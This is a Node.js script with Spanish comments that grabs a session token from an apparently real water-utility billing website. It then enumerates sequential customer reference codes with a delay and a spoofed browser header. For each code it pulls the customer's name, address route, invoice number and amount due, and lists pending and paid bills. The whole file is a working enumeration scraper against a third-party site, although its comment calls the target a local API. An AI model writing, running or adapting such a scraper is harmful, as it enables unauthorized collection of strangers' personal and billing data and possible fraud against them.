/**
 * Script de testeo masivo de codigos de referencia
 * Consulta la API local para encontrar facturas validas
 */

const https = require('https');

const API_BASE_URL = 'ws.suiteneptuno.com';
const API_PATH = '/BarrancaAguasWeb/';

// Configuracion
const CODIGO_INICIO = 26000;
const CANTIDAD = 100;
const DELAY_MS = 800;

let facturas = [];

console.log('============================================');
console.log('  TESTEO MASIVO DE CODIGOS DE REFERENCIA');
console.log('============================================');
console.log(`  Rango: ${CODIGO_INICIO.toString().padStart(6, '0')} - ${(CODIGO_INICIO + CANTIDAD - 1).toString().padStart(6, '0')}`);
console.log('============================================\n');

async function getToken() {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: API_BASE_URL,
            path: API_PATH,
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            const cookies = res.headers['set-cookie'] || [];
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const tokenMatch = data.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
                const token = tokenMatch ? tokenMatch[1] : null;
                const cookieString = cookies.map(c => c.split(';')[0]).join('; ');
                resolve({ token, cookies: cookieString });
            });
        });
        req.on('error', reject);
        req.end();
    });
}

async function consultarFactura(codigo, token, cookies) {
    return new Promise((resolve) => {
        const postData = `codigoUsuario=${encodeURIComponent(codigo)}&__RequestVerificationToken=${encodeURIComponent(token)}`;

        const options = {
            hostname: API_BASE_URL,
            path: `${API_PATH}?handler=ConsultarFactura`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Cookie': cookies,
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'application/json'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    resolve(null);
                }
            });
        });

        req.on('error', () => resolve(null));
        req.write(postData);
        req.end();
    });
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function main() {
    try {
        console.log('Obteniendo token de autenticacion...\n');
        const { token, cookies } = await getToken();

        if (!token) {
            console.log('ERROR: No se pudo obtener el token');
            return;
        }

        for (let i = 0; i < CANTIDAD; i++) {
            const codigo = (CODIGO_INICIO + i).toString().padStart(6, '0');

            const resultado = await consultarFactura(codigo, token, cookies);

            if (resultado && resultado.factura && resultado.factura.NUMERO > 0) {
                const f = resultado.factura;

                if (f.ESTADO === 'P') {
                    console.log(`[PENDIENTE] ${codigo} | ${f.NOMBRE || 'Sin nombre'} | $${f.TOTALAPAGAR || f.SALDO}`);
                    facturas.push({
                        codigo: codigo,
                        estado: 'PENDIENTE',
                        nombre: f.NOMBRE,
                        valor: f.TOTALAPAGAR || f.SALDO,
                        numFactura: f.NUMERO,
                        direccion: f.RUTA
                    });
                } else if (f.ESTADO === 'C') {
                    console.log(`[PAGADA]    ${codigo} | ${f.NOMBRE || 'Sin nombre'}`);
                    facturas.push({
                        codigo: codigo,
                        estado: 'PAGADA',
                        nombre: f.NOMBRE,
                        valor: f.TOTALAPAGAR || f.SALDO,
                        numFactura: f.NUMERO
                    });
                } else {
                    console.log(`[${f.ESTADO}] ${codigo}`);
                }
            } else {
                process.stdout.write(`[--------] ${codigo}\r`);
            }

            await sleep(DELAY_MS);
        }

        console.log('\n\n============================================');
        console.log(`  RESUMEN: ${facturas.length} facturas encontradas`);
        console.log('============================================\n');

        if (facturas.length > 0) {
            console.log('FACTURAS PENDIENTES DE PAGO:');
            console.log('----------------------------');
            facturas.filter(f => f.estado === 'PENDIENTE').forEach(f => {
                console.log(`${f.codigo} | Factura #${f.numFactura} | ${f.nombre} | $${f.valor}`);
            });

            console.log('\nFACTURAS PAGADAS:');
            console.log('-----------------');
            facturas.filter(f => f.estado === 'PAGADA').forEach(f => {
                console.log(`${f.codigo} | Factura #${f.numFactura} | ${f.nombre}`);
            });
        }

    } catch (error) {
        console.error('Error:', error.message);
    }
}

main();
